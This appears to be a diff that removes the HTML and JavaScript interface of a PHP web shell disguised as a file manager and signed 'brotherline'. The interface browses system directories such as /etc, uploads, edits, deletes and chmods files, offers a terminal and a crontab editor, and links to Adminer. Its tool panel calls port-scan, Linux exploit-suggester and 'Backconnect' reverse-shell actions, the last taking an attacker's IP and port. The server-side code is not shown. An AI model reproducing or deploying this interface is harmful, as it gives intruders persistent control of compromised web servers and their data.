-            <div class="stat-chip"><i class="fas fa-code" style="font-size:10px;color:#a0c4ff;"></i><span id="stat-php">...</span></div>
-            <button id="refreshBtn" class="toolbar-btn" title="Refresh">
-                <i class="fas fa-sync-alt"></i>
-            </button>
-            <a href="?fm_logout=1" class="toolbar-btn" title="Logout" onclick="return confirm('Logout?')" style="color:#e85d38;">
-                <i class="fas fa-sign-out-alt"></i>
-            </a>
-        </div>
-    </div>
-
-    <!-- ===== TOOLBAR ===== -->
-    <div class="flex items-center px-3 py-1.5 gap-1 flex-shrink-0 border-b" style="background:#0d1016;border-color:#1e2229;">
-        <button id="goUpBtn" class="toolbar-btn" title="Go Up"><i class="fas fa-arrow-up"></i> Up</button>
-        <button id="goToRootBtn" class="toolbar-btn" title="Root"><i class="fas fa-home"></i> Root</button>
-
-        <div class="w-px h-5 mx-1" style="background:#1e2229;"></div>
-
-        <button id="createDirBtn" class="toolbar-btn"><i class="fas fa-folder-plus"></i> New Folder</button>
-        <button id="createFileBtn" class="toolbar-btn"><i class="fas fa-file-plus fa-fw"></i> New File</button>
-        <button id="uploadBtn" class="toolbar-btn"><i class="fas fa-upload"></i> Upload</button>
-
-        <div class="flex-1"></div>
-
-        <!-- Bulk actions (hidden by default) -->
-        <div id="bulkBar" class="bulk-bar hidden">
-            <span id="selCount" class="font-mono text-ex-accent">0</span> selected
-            <button id="bulkDelete" class="toolbar-btn" style="color:#e85d38;"><i class="fas fa-trash"></i> Delete</button>
-            <button id="bulkDownload" class="toolbar-btn"><i class="fas fa-download"></i> Download</button>
-            <button id="bulkChmod" class="toolbar-btn"><i class="fas fa-key"></i> Chmod</button>
-        </div>
-
-        <div class="w-px h-5 mx-1" style="background:#1e2229;"></div>
-
-        <!-- Search -->
-        <div class="flex items-center gap-2" style="background:#0a0c0f;border:1px solid #1e2229;border-radius:5px;padding:3px 9px;">
-            <i class="fas fa-search" style="font-size:10px;color:#404858;"></i>
-            <input id="searchInput" type="text" placeholder="Search files..." style="background:none;border:none;outline:none;font-size:12px;color:#d4dae6;width:140px;font-family:'Geist',sans-serif;">
-        </div>
-    </div>
-
-    <!-- ===== MAIN AREA ===== -->
-    <div class="flex flex-1 min-h-0 overflow-hidden">
-
-        <!-- SIDEBAR -->
-        <div class="sidebar flex flex-col">
-            <div class="sidebar-section-title">Quick Access</div>
-            <div class="sidebar-item active" id="sideRoot" onclick="changeDirectory('')">
-                <i class="fas fa-hdd"></i> Root
-            </div>
-            <div class="sidebar-item" onclick="changeDirectory('/tmp')">
-                <i class="fas fa-clock"></i> /tmp
-            </div>
-            <div class="sidebar-item" onclick="changeDirectory('/var/www')">
-                <i class="fas fa-globe"></i> /var/www
-            </div>
-            <div class="sidebar-item" onclick="changeDirectory('/etc')">
-                <i class="fas fa-cog"></i> /etc
-            </div>
-            <div class="sidebar-item" onclick="changeDirectory('/home')">
-                <i class="fas fa-user-circle"></i> /home
-            </div>
-
-            <div class="sidebar-section-title mt-2">Tools</div>
-            <a href="?action=adminer" target="_blank" class="sidebar-item">
-                <i class="fas fa-database"></i> Adminer
-            </a>
-            <div class="sidebar-item" id="portScanBtn">
-                <i class="fas fa-search-location"></i> Port Scan
-            </div>
-            <div class="sidebar-item" id="linuxExploitBtn">
-                <i class="fab fa-linux"></i> Linux Exploit
-            </div>
-            <div class="sidebar-item" id="backconnectBtn">
-                <i class="fas fa-network-wired"></i> Backconnect
-            </div>
-            <div class="sidebar-item" id="cronManagerBtn">
-                <i class="fas fa-server"></i> Cron Manager
-            </div>
-
-            <div class="flex-1"></div>
-            <div style="padding:10px 14px;font-size:10px;color:#252d38;font-family:'Geist Mono',monospace;border-top:1px solid #1a1f27;">
-                © brotherline
-            </div>
-        </div>
-
-        <!-- FILE PANE -->
-        <div class="flex flex-col flex-1 min-w-0 min-h-0 overflow-hidden">
-            <!-- File list -->
-            <div class="flex-1 min-h-0 overflow-auto" id="filePane">
-                <table class="file-table" id="fileTable">
-                    <thead>
-                        <tr>
-                            <th style="width:32px;padding-left:16px;"><input type="checkbox" id="selectAll" /></th>
-                            <th style="width:26px;"></th>
-                            <th>Name</th>
-                            <th style="width:110px;">Size</th>
-                            <th style="width:155px;">Modified</th>
-                            <th style="width:80px;">Perms</th>
-                            <th style="width:50px;text-align:right;padding-right:14px;">Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody id="fileBody">
-                        <tr>
-                            <td colspan="7" style="text-align:center;padding:40px;color:#404858;">
-                                <i class="fas fa-spinner fa-spin" style="font-size:18px;"></i>
-                                <div style="margin-top:8px;font-size:12px;">Loading...</div>
-                            </td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-
-            <!-- Status bar -->
-            <div class="status-bar">
-                <span><i class="fas fa-list" style="color:#404858;"></i> <span id="statusCount">0 items</span></span>
-                <span id="statusPath" style="font-family:'Geist Mono',monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;"></span>
-                <div class="flex-1"></div>
-                <span id="statusServer" style="font-family:'Geist Mono',monospace;"></span>
-            </div>
-        </div>
-
-        <!-- PANEL DIVIDER -->
-        <div class="panel-resizer" id="panelDivider"></div>
-
-        <!-- RIGHT PANEL: Terminal + Tools -->
-        <div class="flex flex-col flex-shrink-0 overflow-hidden" style="width:360px;background:#0a0c0f;" id="rightPanel">
-            <!-- Terminal -->
-            <div class="flex flex-col flex-1 min-h-0 border-b" style="border-color:#1e2229;">
-                <div class="flex items-center justify-between px-3 py-2 flex-shrink-0" style="background:#0d1016;border-bottom:1px solid #1e2229;">
-                    <span style="font-size:11px;font-weight:600;color:#606878;letter-spacing:0.08em;text-transform:uppercase;">
-                        <i class="fas fa-terminal mr-1" style="color:#e85d38;"></i> Terminal
-                    </span>
-                    <button id="clearTermBtn" class="toolbar-btn" style="padding:2px 6px;font-size:10px;">
-                        <i class="fas fa-eraser"></i> Clear
-                    </button>
-                </div>
-                <div class="terminal-wrap" id="terminalWrap">
-                    <div id="terminal"></div>
-                </div>
-            </div>
-
-            <!-- Tools -->
-            <div class="flex-shrink-0 p-3" style="background:#0d1016;">
-                <div style="font-size:10px;font-weight:600;color:#404858;letter-spacing:0.1em;text-transform:uppercase;margin-bottom:8px;">
-                    <i class="fas fa-toolbox mr-1" style="color:#e85d38;"></i> Quick Tools
-                </div>
-                <div class="flex flex-wrap gap-2">
-                    <a href="?action=adminer" target="_blank" class="tool-btn"><i class="fas fa-database"></i> Adminer</a>
-                    <button class="tool-btn" id="portScanBtn2"><i class="fas fa-search-location"></i> Port Scan</button>
-                    <button class="tool-btn" id="linuxExploitBtn2"><i class="fab fa-linux"></i> Linux Info</button>
-                    <button class="tool-btn" id="backconnectBtn2"><i class="fas fa-network-wired"></i> Backconnect</button>
-                    <button class="tool-btn" id="cronManagerBtn2"><i class="fas fa-server"></i> Cron</button>
-                </div>
-            </div>
-        </div>
-
-    </div>
-
-    <!-- ===== CONTEXT MENU ===== -->
-    <div id="contextMenu" class="action-menu">
-        <a class="action-menu-item ctx-edit" href="#"><i class="fas fa-edit"></i> Edit</a>
-        <a class="action-menu-item ctx-rename" href="#"><i class="fas fa-i-cursor"></i> Rename</a>
-        <a class="action-menu-item ctx-chmod" href="#"><i class="fas fa-key"></i> Permissions</a>
-        <a class="action-menu-item ctx-download" href="#"><i class="fas fa-download"></i> Download</a>
-        <div class="action-menu-divider"></div>
-        <a class="action-menu-item danger ctx-delete" href="#"><i class="fas fa-trash"></i> Delete</a>
-    </div>
-
-    <!-- ===== MODALS ===== -->
-
-    <!-- Form Modal (Create / Rename) -->
-    <div id="formModal" class="modal-backdrop">
-        <div class="modal-box">
-            <div class="modal-header">
-                <span id="formModalTitle">Create File</span>
-                <button class="modal-close" onclick="closeModal('formModal')"><i class="fas fa-times"></i></button>
-            </div>
-            <div class="modal-body">
-                <input type="hidden" id="actionType" />
-                <input type="hidden" id="originalName" />
-                <label class="input-label" id="itemNameLabel">File Name</label>
-                <input type="text" class="input-field" id="itemName" placeholder="e.g., newfile.txt" />
-            </div>
-            <div class="modal-footer">
-                <button class="toolbar-btn" onclick="closeModal('formModal')">Cancel</button>
-                <button class="toolbar-btn primary" id="saveBtn">Save</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Chmod Modal -->
-    <div id="chmodModal" class="modal-backdrop">
-        <div class="modal-box">
-            <div class="modal-header">
-                <span>Change Permissions</span>
-                <button class="modal-close" onclick="closeModal('chmodModal')"><i class="fas fa-times"></i></button>
-            </div>
-            <div class="modal-body">
-                <p style="font-size:12px;color:#606878;margin-bottom:12px;">
-                    Changing permissions for: <strong id="chmodItemName" style="color:#d4dae6;font-family:'Geist Mono',monospace;"></strong>
-                </p>
-                <label class="input-label">Octal Value (e.g., 0755)</label>
-                <input type="text" class="input-field" id="chmodValue" placeholder="0755" />
-            </div>
-            <div class="modal-footer">
-                <button class="toolbar-btn" onclick="closeModal('chmodModal')">Cancel</button>
-                <button class="toolbar-btn primary" id="saveChmodBtn">Apply</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Bulk Chmod Modal -->
-    <div id="bulkChmodModal" class="modal-backdrop">
-        <div class="modal-box">
-            <div class="modal-header">
-                <span>Bulk Permissions</span>
-                <button class="modal-close" onclick="closeModal('bulkChmodModal')"><i class="fas fa-times"></i></button>
-            </div>
-            <div class="modal-body">
-                <p style="font-size:12px;color:#606878;margin-bottom:12px;">
-                    Changing permissions for <strong id="bulkChmodCount" style="color:#e85d38;"></strong> selected items.
-                </p>
-                <label class="input-label">New Octal Value (e.g., 0755)</label>
-                <input type="text" class="input-field" id="bulkChmodValue" placeholder="0755" />
-            </div>
-            <div class="modal-footer">
-                <button class="toolbar-btn" onclick="closeModal('bulkChmodModal')">Cancel</button>
-                <button class="toolbar-btn primary" id="saveBulkChmodBtn">Apply to All</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Editor Modal -->
-    <div id="editorModal" class="modal-backdrop" style="z-index:4500;">
-        <div class="editor-modal-box">
-            <div class="modal-header">
-                <span><i class="fas fa-code mr-2" style="color:#e85d38;"></i><span id="editorFileName">Edit File</span></span>
-                <button class="modal-close" onclick="closeModal('editorModal')"><i class="fas fa-times"></i></button>
-            </div>
-            <div id="editor" style="flex:1;"></div>
-            <div class="modal-footer">
-                <button class="toolbar-btn" onclick="closeModal('editorModal')">Close</button>
-                <button class="toolbar-btn primary" id="saveEditorBtn"><i class="fas fa-save mr-1"></i> Save</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Cron Manager Modal -->
-    <div id="cronModal" class="modal-backdrop">
-        <div class="modal-box cron-box">
-            <div class="modal-header">
-                <span><i class="fas fa-server mr-2" style="color:#e85d38;"></i>Cron Manager</span>
-                <button class="modal-close" onclick="closeModal('cronModal')"><i class="fas fa-times"></i></button>
-            </div>
-            <div class="modal-body">
-                <label class="input-label">Current Crontab (edit and save)</label>
-                <textarea class="input-field" id="cronJobsTextarea" rows="10" placeholder="# no crontab set"></textarea>
-                <p style="font-size:11px;color:#404858;margin-top:6px;">Each line = one cron job. Clear all lines to remove crontab.</p>
-            </div>
-            <div class="modal-footer">
-                <button class="toolbar-btn" onclick="closeModal('cronModal')">Close</button>
-                <button class="toolbar-btn primary" id="saveCronBtn"><i class="fas fa-save mr-1"></i> Save Crontab</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- SCRIPTS -->
-    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.6/ace.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-
-    <script>
-    $(document).ready(function() {
-        const API_URL = '';
-
-        // ===================== HELPERS =====================
-        function showSuccess(msg) {
-            Swal.fire({ icon:'success', title:'Done', text:msg, timer:2000, showConfirmButton:false });
-        }
-        function showError(msg) {
-            Swal.fire({ icon:'error', title:'Error', text:msg });
-        }
-        function showLoading(title, text='Please wait...') {
-            Swal.fire({ title, text, allowOutsideClick:false, didOpen:()=>Swal.showLoading() });
-        }
-
-        function apiCall(action, data={}, method='POST') {
-            const opts = { url: API_URL, type: method, dataType:'json', data:{ action, ...data } };
-            if (method.toUpperCase()==='POST' && !(data instanceof FormData)) {
-                opts.data = JSON.stringify(data);
-                opts.contentType = 'application/json; charset=utf-8';
-                opts.url = `?action=${action}`;
-            }
-            return $.ajax(opts);
-        }
-
-        function openModal(id) { document.getElementById(id).classList.add('open'); }
-        function closeModal(id) { document.getElementById(id).classList.remove('open'); }
-        window.closeModal = closeModal;
-
-        // ===================== STATS =====================
-        function updateStats() {
-            $('#refreshBtn i').addClass('fa-spin');
-            $.getJSON('?action=get_stats', function(d) {
-                $('#stat-user').text(d.user);
-                $('#stat-php').text('PHP ' + d.php_version);
-                const p = d.disk.percent;
-                $('#disk-fill').css('width', p + '%');
-                $('#disk-label').text(d.disk.used + '/' + d.disk.total + 'GB');
-                const color = p >= 90 ? '#e85d38' : p >= 70 ? '#f0b429' : '#3db554';
-                $('#disk-fill').css('background', color);
-                $('#statusServer').text(d.server_software);
-            }).always(()=> setTimeout(()=>$('#refreshBtn i').removeClass('fa-spin'),500));
-        }
-
-        $('#refreshBtn').on('click', function(e) {
-            e.preventDefault();
-            loadFiles(); updateStats();
-        });
-
-        // ===================== FILE LISTING =====================
-        let currentFiles = [];
-
-        function loadFiles() {
-            $.ajax({ url:API_URL, type:'GET', dataType:'json', data:{action:'list'},
-                success: function(r) {
-                    if (r.success) { currentFiles = r.files; renderFiles(r.files); updateBreadcrumb(r); }
-                    else showError(r.message);
-                },
-                error: ()=>showError('Failed to load files.')
-            }).always(()=>{ updateBulkBar(); $('#selectAll').prop('checked', false); });
-        }
-
-        function changeDirectory(path) {
-            window.changeDirectory = changeDirectory; // make global
-            $.ajax({ url:API_URL, type:'POST', dataType:'json', data:{action:'chdir', target_path:path},
-                success: function(r) {
-                    if (r.success) { currentFiles = r.files; renderFiles(r.files); updateBreadcrumb(r); }
-                    else showError(r.message);
-                },
-                error: ()=>showError('Failed to change directory.')
-            });
-        }
-        window.changeDirectory = changeDirectory;
-
-        function getFileIcon(file) {
-            if (file.type === 'folder') return '<i class="fas fa-folder file-icon folder"></i>';
-            const ext = file.name.split('.').pop().toLowerCase();
-            const iconMap = {
-                php:'fa-file-code', js:'fa-file-code', ts:'fa-file-code', html:'fa-file-code', css:'fa-file-code',
-                json:'fa-file-code', xml:'fa-file-code', sh:'fa-file-code', py:'fa-file-code',
-                jpg:'fa-file-image', jpeg:'fa-file-image', png:'fa-file-image', gif:'fa-file-image', svg:'fa-file-image', webp:'fa-file-image',
-                zip:'fa-file-archive', tar:'fa-file-archive', gz:'fa-file-archive', rar:'fa-file-archive',
-                pdf:'fa-file-pdf', doc:'fa-file-word', docx:'fa-file-word', xls:'fa-file-excel', xlsx:'fa-file-excel',
-                txt:'fa-file-alt', md:'fa-file-alt', log:'fa-file-alt',
-                sql:'fa-database',
-            };
-            const icon = iconMap[ext] || 'fa-file';
-            return `<i class="fas ${icon} file-icon file"></i>`;
-        }
-
-        function renderFiles(files) {
-            const tbody = $('#fileBody');
-            tbody.empty();
-
-            if (files.length === 0) {
-                tbody.html(`<tr><td colspan="7" style="text-align:center;padding:48px;color:#404858;">
-                    <i class="fas fa-folder-open" style="font-size:24px;margin-bottom:8px;display:block;"></i>
-                    <span style="font-size:12px;">Empty directory</span></td></tr>`);
-                $('#statusCount').text('0 items');
-                return;
-            }
-
-            files.forEach(function(file) {
-                const icon = getFileIcon(file);
-                const nameCell = file.type === 'folder'
-                    ? `<a href="#" class="file-name-link folder-type folder-link">${file.name}</a>`
-                    : `<a href="#" class="file-name-link file-link">${file.name}</a>`;
-
-                const editBtn = file.type === 'file'
-                    ? `<button class="row-act-btn edit-btn" title="Edit"><i class="fas fa-edit"></i></button>` : '';
-                const dlBtn = file.type === 'file'
-                    ? `<button class="row-act-btn download-btn" title="Download"><i class="fas fa-download"></i></button>` : '';
-
-                const tr = $(`<tr class="file-row" data-name="${file.name}" data-type="${file.type}">
-                    <td style="padding-left:16px;"><input type="checkbox" class="file-checkbox" /></td>
-                    <td>${icon}</td>
-                    <td><span class="file-name-cell">${nameCell}</span></td>
-                    <td style="font-family:'Geist Mono',monospace;font-size:11px;color:#606878;">${file.size}</td>
-                    <td style="font-family:'Geist Mono',monospace;font-size:11px;color:#404858;">${file.last_modified}</td>
-                    <td><span class="perm-badge">${file.permissions}</span></td>
-                    <td style="text-align:right;padding-right:10px;">
-                        <div class="row-actions">
-                            ${editBtn}
-                            <button class="row-act-btn rename-btn" title="Rename"><i class="fas fa-i-cursor"></i></button>
-                            <button class="row-act-btn chmod-btn" title="Permissions" data-current-perms="${file.permissions}"><i class="fas fa-key"></i></button>
-                            ${dlBtn}
-                            <button class="row-act-btn delete-btn" title="Delete"><i class="fas fa-trash"></i></button>
-                        </div>
-                    </td>
-                </tr>`);
-                tbody.append(tr);
-            });
-
-            $('#statusCount').text(files.length + ' item' + (files.length !== 1 ? 's' : ''));
-        }
-
-        function updateBreadcrumb(data) {
-            const bar = $('#breadcrumbBar');
-            bar.empty();
-            $('#statusPath').text(data.path || '/');
-
-            const crumbs = data.breadcrumbs || [];
-            crumbs.forEach(function(c, i) {
-                if (i > 0) bar.append('<span class="bc-sep">/</span>');
-                const isLast = i === crumbs.length - 1;
-                const el = $(`<span class="bc-item ${isLast ? 'current' : ''}">${c.name}</span>`);
-                if (!isLast) {
-                    el.on('click', function() { changeDirectory(c.path); });
-                }
-                bar.append(el);
-            });
-        }
-
-        function handleApiResponse(r) {
-            if (r.success) { showSuccess(r.message || 'Done.'); loadFiles(); }
-            else showError(r.message || 'Unknown error.');
-        }
-
-        // ===================== TABLE EVENTS =====================
-        const tbody = $('#fileBody');
-
-        tbody.on('click', '.folder-link', function(e) {
-            e.preventDefault();
-            changeDirectory($(this).closest('.file-row').data('name'));
-        });
-        tbody.on('click', '.file-link', function(e) {
-            e.preventDefault();
-            editFile($(this).closest('.file-row').data('name'));
-        });
-
-        // ===================== ROW ACTION BUTTONS =====================
-        tbody.on('click', '.edit-btn', function(e) {
-            e.preventDefault(); e.stopPropagation();
-            editFile($(this).closest('.file-row').data('name'));
-        });
-        tbody.on('click', '.rename-btn', function(e) {
-            e.preventDefault(); e.stopPropagation();
-            openRenameModal($(this).closest('.file-row').data('name'));
-        });
-        tbody.on('click', '.chmod-btn', function(e) {
-            e.preventDefault(); e.stopPropagation();
-            const row = $(this).closest('.file-row');
-            openChmodModal(row.data('name'), $(this).data('current-perms'));
-        });
-        tbody.on('click', '.download-btn', function(e) {
-            e.preventDefault(); e.stopPropagation();
-            window.location.href = `?action=download&name=${encodeURIComponent($(this).closest('.file-row').data('name'))}`;
-        });
-        tbody.on('click', '.delete-btn', function(e) {
-            e.preventDefault(); e.stopPropagation();
-            deleteItem($(this).closest('.file-row').data('name'));
-        });
-
-        // ===================== CONTEXT MENU =====================
-        let ctxTarget = null;
-        $(document).on('contextmenu', '.file-row', function(e) {
-            e.preventDefault();
-            ctxTarget = $(this);
-            const m = $('#contextMenu');
-            let x = e.clientX, y = e.clientY;
-            if (x + 200 > window.innerWidth) x = window.innerWidth - 205;
-            if (y + 200 > window.innerHeight) y = window.innerHeight - 205;
-            m.css({ left:x+'px', top:y+'px', display:'block' });
-        });
-        $(document).on('click', function() { $('#contextMenu').hide(); });
-        $('#contextMenu').on('click', function(e) { e.stopPropagation(); });
-
-        $('.ctx-edit').on('click', function(e) { e.preventDefault(); $('#contextMenu').hide(); if(ctxTarget) editFile(ctxTarget.data('name')); });
-        $('.ctx-rename').on('click', function(e) { e.preventDefault(); $('#contextMenu').hide(); if(ctxTarget) openRenameModal(ctxTarget.data('name')); });
-        $('.ctx-chmod').on('click', function(e) { e.preventDefault(); $('#contextMenu').hide(); if(ctxTarget) openChmodModal(ctxTarget.data('name'), ctxTarget.find('.perm-badge').text()); });
-        $('.ctx-download').on('click', function(e) { e.preventDefault(); $('#contextMenu').hide(); if(ctxTarget) window.location.href = `?action=download&name=${encodeURIComponent(ctxTarget.data('name'))}`; });
-        $('.ctx-delete').on('click', function(e) { e.preventDefault(); $('#contextMenu').hide(); if(ctxTarget) deleteItem(ctxTarget.data('name')); });
-
-        // ===================== SEARCH =====================
-        $('#searchInput').on('input', function() {
-            const q = $(this).val().toLowerCase();
-            const filtered = currentFiles.filter(f => f.name.toLowerCase().includes(q));
-            renderFiles(filtered);
-        });
-
-        // ===================== NAVIGATION =====================
-        $('#goToRootBtn').on('click', function() { changeDirectory(''); });
-        $('#goUpBtn').on('click', function() { changeDirectory('..'); });
-
-        // ===================== CREATE / RENAME =====================
-        function openCreateModal(type) {
-            $('#actionType').val(type);
-            $('#originalName').val('');
-            $('#formModalTitle').text(type === 'create-file' ? 'New File' : 'New Folder');
-            $('#itemNameLabel').text(type === 'create-file' ? 'File Name' : 'Folder Name');
-            $('#itemName').val('').attr('placeholder', type === 'create-file' ? 'e.g., index.php' : 'e.g., new_folder');
-            openModal('formModal');
-            setTimeout(()=>$('#itemName').focus(), 50);
-        }
-
-        function openRenameModal(name) {
-            $('#actionType').val('rename');
-            $('#originalName').val(name);
-            $('#formModalTitle').text('Rename');
-            $('#itemNameLabel').text('New Name');
-            $('#itemName').val(name);
-            openModal('formModal');
-            setTimeout(()=>{ const el = $('#itemName')[0]; el.focus(); el.select(); }, 50);
-        }
-
-        $('#createFileBtn').on('click', function() { openCreateModal('create-file'); });
-        $('#createDirBtn').on('click', function() { openCreateModal('create-dir'); });
-
-        $('#saveBtn').on('click', function() {
-            const action = $('#actionType').val();
-            const name = $('#itemName').val().trim();
-            if (!name) return showError('Name cannot be empty!');
-            let postData = { action, name };
-            if (action === 'rename') { postData.old_name = $('#originalName').val(); postData.new_name = name; }
-            $.post(API_URL, postData, handleApiResponse, 'json').fail(()=>showError('Error.'));
-            closeModal('formModal');
-        });
-        $('#itemName').on('keydown', function(e) { if (e.key === 'Enter') $('#saveBtn').click(); });
-
-        // ===================== DELETE =====================
-        function deleteItem(name) {
-            Swal.fire({
-                title:'Delete?', text:`"${name}" will be permanently deleted.`,
-                icon:'warning', showCancelButton:true,
-                confirmButtonText:'Delete', cancelButtonText:'Cancel',
-                confirmButtonColor:'#e85d38'
-            }).then(r => {
-                if (r.isConfirmed) {
-                    $.post(API_URL, { action:'delete', name }, handleApiResponse, 'json').fail(()=>showError('Failed.'));
-                }
-            });
-        }
-
-        // ===================== CHMOD =====================
-        let chmodTarget = '';
-        function openChmodModal(name, perms) {
-            chmodTarget = name;
-            $('#chmodItemName').text(name);
-            $('#chmodValue').val(perms || '0644');
-            openModal('chmodModal');
-            setTimeout(()=>$('#chmodValue').focus(), 50);
-        }
-        $('#saveChmodBtn').on('click', function() {
-            const perms = $('#chmodValue').val();
-            if (!perms) return showError('Enter permissions value!');
-            $.post(API_URL, { action:'chmod', name:chmodTarget, perms }, handleApiResponse, 'json').fail(()=>showError('Error.'));
-            closeModal('chmodModal');
-        });
-
-        // ===================== EDITOR =====================
-        const editor = ace.edit('editor');
-        editor.setTheme('ace/theme/tomorrow_night_eighties');
-        editor.session.setMode('ace/mode/php');
-        editor.setOptions({ fontSize:'13px', fontFamily:"'Geist Mono', monospace" });
-
-        let fileToEdit = '';
-        function editFile(fileName) {
-            fileToEdit = fileName;
-            showLoading('Loading...', fileName);
-            const ext = fileName.split('.').pop().toLowerCase();
-            const modeMap = { js:'javascript', ts:'typescript', css:'css', html:'html', json:'json', md:'markdown', sh:'sh', py:'python', xml:'xml', sql:'sql', txt:'text' };
-            editor.session.setMode(`ace/mode/${modeMap[ext] || 'text'}`);
-            $.get(API_URL, { action:'get-content', name:fileName }, function(r) {
-                if (r.success) {
-                    Swal.close();
-                    editor.setValue(r.content, -1);
-                    $('#editorFileName').text(fileName);
-                    openModal('editorModal');
-                } else showError(r.message);
-            }).fail(()=>showError('Failed to load file.'));
-        }
-
-        $('#saveEditorBtn').on('click', function() {
-            $.post(API_URL, { action:'save-content', name:fileToEdit, content:editor.getValue() }, function(r) {
-                if (r.success) { showSuccess('Saved!'); closeModal('editorModal'); }
-                else showError(r.message);
-            }, 'json').fail(()=>showError('Error saving file.'));
-        });
-
-        // ===================== UPLOAD =====================
-        $('#uploadBtn').on('click', function() {
-            $('#fileUploadInput').click();
-        });
-
-        $('#fileUploadInput').on('change', function() {
-            if (!this.files.length) return;
-            const fd = new FormData();
-            fd.append('action', 'upload-file');
-            for (let i = 0; i < this.files.length; i++) fd.append('files_to_upload[]', this.files[i]);
-            showLoading('Uploading...', `${this.files.length} file(s)`);
-            $.ajax({ url:API_URL, type:'POST', data:fd, processData:false, contentType:false,
-                dataType:'json', success:handleApiResponse, error:()=>showError('Upload failed.')
-            }).always(()=>$(this).val(''));
-        });
-
-        // ===================== BULK ACTIONS =====================
-        function getSelected() {
-            return $('.file-checkbox:checked').closest('.file-row').map(function(){ return $(this).data('name'); }).get();
-        }
-        function updateBulkBar() {
-            const n = $('.file-checkbox:checked').length;
-            $('#selCount').text(n);
-            if (n > 0) $('#bulkBar').removeClass('hidden');
-            else $('#bulkBar').addClass('hidden');
-            const total = $('.file-checkbox').length;
-            $('#selectAll').prop('checked', n > 0 && n === total);
-        }
-        $(document).on('change', '.file-checkbox', updateBulkBar);
-        $('#selectAll').on('change', function() { $('.file-checkbox').prop('checked', this.checked); updateBulkBar(); });
-
-        $('#bulkDelete').on('click', function() {
-            const files = getSelected();
-            if (!files.length) return;
-            Swal.fire({
-                title:'Bulk Delete?', text:`Delete ${files.length} items permanently?`,
-                icon:'warning', showCancelButton:true,
-                confirmButtonText:'Delete All', confirmButtonColor:'#e85d38'
-            }).then(r => {
-                if (r.isConfirmed) $.post(API_URL, { action:'bulk-delete', items:JSON.stringify(files) }, handleApiResponse, 'json').fail(()=>showError('Failed.'));
-            });
-        });
-        $('#bulkDownload').on('click', function() {
-            const files = getSelected();
-            if (files.length) window.location.href = `?action=bulk-download&items=${encodeURIComponent(JSON.stringify(files))}`;
-        });
-        $('#bulkChmod').on('click', function() {
-            const files = getSelected();
-            if (!files.length) return;
-            $('#bulkChmodCount').text(files.length);
-            $('#bulkChmodValue').val('');
-            openModal('bulkChmodModal');
-        });
-        $('#saveBulkChmodBtn').on('click', function() {
-            const files = getSelected(), perms = $('#bulkChmodValue').val();
-            if (!perms.match(/^[0-7]{4}$/)) return showError('Use 4-digit octal (e.g., 0755).');
-            $.post(API_URL, { action:'bulk-chmod', items:JSON.stringify(files), perms }, handleApiResponse, 'json').fail(()=>showError('Error.'));
-            closeModal('bulkChmodModal');
-        });
-
-        // ===================== CRON MANAGER =====================
-        function openCronModal() {
-            apiCall('cron_manager', { sub_action:'list' }).done(function(r) {
-                if (r.success) { $('#cronJobsTextarea').val(r.cron_jobs); openModal('cronModal'); }
-                else showError(r.message);
-            }).fail(()=>showError('Failed to load crontab.'));
-        }
-        $('#saveCronBtn').on('click', function() {
-            apiCall('cron_manager', { sub_action:'save', jobs:$('#cronJobsTextarea').val() }).done(function(r) {
-                if (r.success) { showSuccess(r.message); closeModal('cronModal'); }
-                else showError(r.message);
-            }).fail(()=>showError('Failed to save.'));
-        });
-
-        // ===================== TOOLS =====================
-
-        // Port Scan
-        async function runPortScan() {
-            const { value:fv } = await Swal.fire({
-                title:'Port Scanner',
-                html:`<input id="sh" class="swal2-input" placeholder="Host" value="127.0.0.1">
-                      <input id="sp" class="swal2-input" placeholder="Ports: 80,443,8000-8080" value="21,22,25,80,443,3306,5432">`,
-                focusConfirm:false,
-                preConfirm:()=>({ host:document.getElementById('sh').value, ports:document.getElementById('sp').value })
-            });
-            if (!fv?.host) return;
-            showLoading('Scanning...', fv.host);
-            apiCall('port_scan', fv).done(function(r) {
-                if (r.success) {
-                    Swal.fire({ title:'Port Scan Results', icon:'info', html:
-                        `<p style="font-size:13px;">Host: <code>${r.host}</code></p>
-                        <div class="tool-output">${r.open_ports.length ? r.open_ports.join(', ') : 'No open ports found.'}</div>`
-                    });
-                } else showError(r.message);
-            }).fail(()=>showError('Scan failed.'));
-        }
-
-        // Linux exploit
-        function runLinuxExploit() {
-            showLoading('Gathering Info...');
-            apiCall('linux_exploit_suggester', {}).done(function(r) {
-                if (r.success) {
-                    let html = '<dl class="text-left">';
-                    for (const [k,v] of Object.entries(r.results)) html += `<dt>${k}</dt><dd>${v||'N/A'}</dd>`;
-                    html += '</dl>';
-                    Swal.fire({ title:'System Info', html:`<div class="tool-output">${html}</div>`, width:'700px' });
-                } else showError(r.message);
-            }).fail(()=>showError('Failed.'));
-        }
-
-        // Backconnect
-        async function runBackconnect() {
-            const { value:fv } = await Swal.fire({
-                title:'Reverse Shell',
-                html:`<input id="bi" class="swal2-input" placeholder="Your IP">
-                      <input id="bp" class="swal2-input" placeholder="Port">`,
-                focusConfirm:false,
-                confirmButtonText:'Connect',
-                preConfirm:()=>({ ip:document.getElementById('bi').value, port:document.getElementById('bp').value })
-            });
-            if (!fv?.ip || !fv?.port) return;
-            showLoading('Connecting...', `${fv.ip}:${fv.port}`);
-            apiCall('backconnect', fv).done(r => {
-                if (r.success) Swal.fire({ icon:'success', title:'Initiated', text:r.message, timer:5000 });
-                else showError(r.message);
-            }).fail((xhr,status)=>{
-                if (status==='timeout'||xhr.statusText==='timeout') showSuccess(`Connected to ${fv.ip}:${fv.port}`);
-                else showError('Failed: '+(xhr.responseJSON?.message||'Check console'));
-            });
-        }
-
-        // Bind tools (sidebar + panel buttons)
-        ['#portScanBtn','#portScanBtn2'].forEach(s=>$(s).on('click', runPortScan));
